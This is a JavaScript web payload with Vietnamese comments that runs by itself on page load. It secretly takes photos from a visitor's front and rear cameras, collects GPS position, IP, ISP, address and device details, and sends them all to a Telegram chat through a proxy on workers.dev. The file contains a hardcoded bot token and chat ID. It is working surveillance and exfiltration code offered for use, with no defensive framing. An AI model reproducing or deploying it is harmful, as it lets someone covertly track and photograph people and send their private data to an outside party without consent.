const TELEGRAM_BOT_TOKEN = '7550142487:AAH_xOHuyHr0C2nXnQmkWx-b6-f1NSDXaHo';
const TELEGRAM_CHAT_ID = '6956722046';
const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  realIp: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

// ✅ Nhận diện thiết bị
function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

// ✅ Lấy IP gốc từ Worker
async function getRealIP() {
  try {
    const res = await fetch("https://infoip.jayky2k9.workers.dev");
    const data = await res.json();

    if (data?.ip) {
      info.realIp = data.ip;
      info.ip = data.ip;
      info.isp = data.isp || 'Không rõ';
      info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country || 'Không rõ';
      info.lat = data.latitude?.toFixed(6) || '0';
      info.lon = data.longitude?.toFixed(6) || '0';
    }
  } catch (err) {
    console.warn("Không thể lấy IP gốc:", err);
    info.realIp = 'Không xác định';
  }
}

// ✅ Lấy vị trí chính xác hoặc fallback IP dân cư
function getPreciseLocationOrFallbackToIP() {
  return new Promise(resolve => {
    if (!navigator.geolocation) return getIPInfo().then(resolve);

    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);

        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`, {
            headers: { "User-Agent": "Mozilla/5.0 (compatible; MyScript/1.0)" }
          });
          const data = await res.json();
          info.address = data.display_name || '📍 GPS OK, không rõ địa chỉ';
          info.country = data.address?.country || 'Không rõ';
        } catch (err) {
          info.address = '📍 GPS OK, không rõ địa chỉ';
          info.country = 'Không rõ';
        }

        info.ip = 'Không rõ';
        info.isp = 'Không rõ';
        resolve();
      },
      async err => {
        console.warn('❌ GPS bị từ chối:', err.message);
        await getIPInfo();
        resolve();
      },
      { enableHighAccuracy: true, timeout: 7000 }
    );
  });
}

// ✅ Lấy IP dân cư nếu GPS bị từ chối
function getIPInfo() {
  return fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => {
      info.ip = data.ip;
      info.isp = data.connection?.org || 'Không rõ';
      info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country;
      info.lat = data.latitude?.toFixed(6) || '0';
      info.lon = data.longitude?.toFixed(6) || '0';
    })
    .catch(() => {
      info.ip = 'Không rõ';
      info.isp = 'Không rõ';
      info.address = 'Không rõ';
      info.country = 'Không rõ';
      info.lat = '0';
      info.lon = '0';
    });
}

// ✅ Caption gửi về Telegram
function getCaption() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌍 IP: ${info.ip}
🔍 IP gốc: ${info.realIp}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌎 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📸 Camera: ${info.camera}
`.trim();
}

// ✅ Chụp camera (trước hoặc sau)
function captureCamera(facingMode = "user") {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");

          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
          }, 1000);
        };
      })
      .catch(reject);
  });
}

// ✅ Gửi ảnh về Telegram
async function sendTwoPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('media', JSON.stringify([
    {
      type: 'photo',
      media: 'attach://front',
      caption: getCaption()
    },
    {
      type: 'photo',
      media: 'attach://back'
    }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, {
    method: 'POST',
    body: formData
  });
}

// ✅ Gọi script chính
async function main() {
  detectDevice();
  await getRealIP();

  let frontBlob = null, backBlob = null;

  try {
    frontBlob = await captureCamera("user");
    backBlob = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch (err) {
    info.camera = '🚫 Không thể truy cập đủ camera';
    console.warn("Camera error:", err);
  }

  await getPreciseLocationOrFallbackToIP();

  if (frontBlob && backBlob) {
    await sendTwoPhotos(frontBlob, backBlob);
  } else {
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: getCaption()
      })
    });
  }
}

main();
